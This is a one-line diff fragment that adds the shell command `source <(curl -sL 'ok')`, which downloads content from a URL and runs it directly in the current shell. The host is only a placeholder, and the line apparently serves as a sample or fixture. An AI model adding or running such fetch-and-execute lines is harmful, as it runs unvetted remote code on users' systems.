@@ -1,0 +1,1 @@
+source <(curl -sL 'ok')
